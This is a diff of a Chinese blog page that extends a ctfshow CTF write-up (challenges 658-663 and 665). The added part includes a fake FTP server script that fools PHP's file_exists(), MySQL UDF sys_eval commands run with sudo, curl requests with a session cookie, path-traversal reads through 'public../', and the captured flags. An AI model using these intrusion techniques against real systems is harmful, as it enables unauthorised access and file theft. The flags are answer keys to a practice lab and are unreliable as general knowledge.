@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-07
+                    2022-02-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    609
+                    998
                 </div>
                 
 
@@ -500,8 +500,8 @@
 <p>3.创建自定义函数</p>
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219195859196.png" alt="image-20211219195859196"></p>
 <p>不要忘记 base64解码后 再放进去 udf.so 文件中</p>
-<p><img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211219195946821.png" alt="image-20211219195946821"></p>
-<p><img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211219200044995.png" alt="image-20211219200044995"></p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219195946821.png" alt="image-20211219195946821"></p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219200044995.png" alt="image-20211219200044995"></p>
 <p>赋予最高权限</p>
 <p>再然后到数据库中 执行自定义函数  别忘记加sudo命令</p>
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219200143737.png" alt="image-20211219200143737"></p>
@@ -532,6 +532,67 @@ print(a)
 <p>flag_656=ctfshow{e0b80d6b99d2bdbae36f121f78abe96b}</p>
 <h2 id="657"><a href="#657" class="headerlink" title="657"></a>657</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220113140742418.png" alt="image-20220113140742418"></p>
 <p>flag_657=ctfshow{2a73f8f87a58a13c23818fafd83510b1}</p>
+<h2 id="658"><a href="#658" class="headerlink" title="658"></a>658</h2><p>添加以下说明，file_exists()函数可以访问ftp上的文件。那么思路就是先自己起一个ftpserver，无论请求任何文件都返回文件存在，发现已控制的主机A安装有python3</p>
+<p>上传ftp伪造脚本：</p>
+<pre class="line-numbers language-none"><code class="language-none">import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.bind(('0.0.0.0', 21))
+s.listen(1)
+print('listening 0.0.0.0 21\n')
+conn, addr = s.accept()
+
+conn.send(b'220 a\n')
+conn.send(b'230 a\n')
+conn.send(b'200 a\n')
+conn.send(b'200 a\n')
+conn.send(b'200\n')
+conn.send(b'200 a\n')
+conn.send(b'200\n')
+conn.send(b'200 a\n')
+
+conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行21端口监听</p>
+<pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo nohup python3 /var/www/html/file_exits.py &gt; /tmp/error.log 2&gt;&amp;1 &amp;');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>绕过文件检查</p>
+<pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl --cookie "PHPSESSID=0mhvks32cer6mrstfkido446j8;" "http://172.2.244.5/index.php?action=main&amp;m=testFile&amp;f=ftp://web/aa"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="659"><a href="#659" class="headerlink" title="659"></a>659</h2><pre class="line-numbers language-none"><code class="language-none">curl http://172.2.234.5/robots.txt  得到 /public/
+curl http://172.2.234.5/public/  然后一路往下
+curl http://172.2.234.5/public/Readme.txt
+ curl http://172.2.234.5/public../
+ curl http://172.2.234.5/public../FLAG/
+ curl http://172.2.234.5/public../FLAG/flag659.txt 
+ 得到
+ flag_659=ctfshow{73c4213829f8b393b2082bacb4253cab}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220209212546406.png" alt="image-20220209212546406"></p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220209212712215.png" alt="image-20220209212712215"></p>
+<p>或者利用file_get_contents</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220209215515177.png" alt="image-20220209215515177"></p>
+<h2 id="665"><a href="#665" class="headerlink" title="665"></a>665</h2><p>顺路得到flag 665</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220209215837663.png" alt="image-20220209215837663"></p>
+<h2 id="660"><a href="#660" class="headerlink" title="660"></a>660</h2><p>让管理员去访问action=login，他自己会传个flag过去。<br>然后去日志里面看下。</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210090030744.png" alt="image-20220210090030744"></p>
+<p>flag_660_ctfshow{23e56d95b430de80c7b5806f49a14a2b}</p>
+<h2 id="661"><a href="#661" class="headerlink" title="661"></a>661</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210090333472.png" alt="image-20220210090333472"></p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210090404533.png" alt="image-20220210090404533"></p>
+<p>flag_661=ctfshow{d41c308e12fdecf7782eeb7c20f45352}</p>
+<h2 id="662-663"><a href="#662-663" class="headerlink" title="662-663"></a>662-663</h2><pre class="line-numbers language-none"><code class="language-none">1=echo file_get_contents("http://172.2.166.5/public../home/www-data/creater.sh ");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>就是说flag663在一个xxx.html中，前缀是三位数的十六进制</p>
+<p>三位数爆破得到</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210100730505.png" alt="image-20220210100730505"></p>
+<p>扫描得到phpinfo.php  </p>
+<p>发现存在ctfshow扩展</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105306834.png" alt="image-20220210105306834"></p>
+<p>拓展目录<img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105347967.png" alt="image-20220210105347967"></p>
+<p>下载到本地 </p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105421151.png" alt="image-20220210105421151"></p>
+<p>进行反汇编或者直接0101打开，得到elf文件：</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105233107.png" alt="image-20220210105233107"></p>
 
                 
             </div>
@@ -1064,7 +1125,7 @@ print(a)
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">10.3k</span>
+                        class="white-color">10.7k</span>
             
             
             
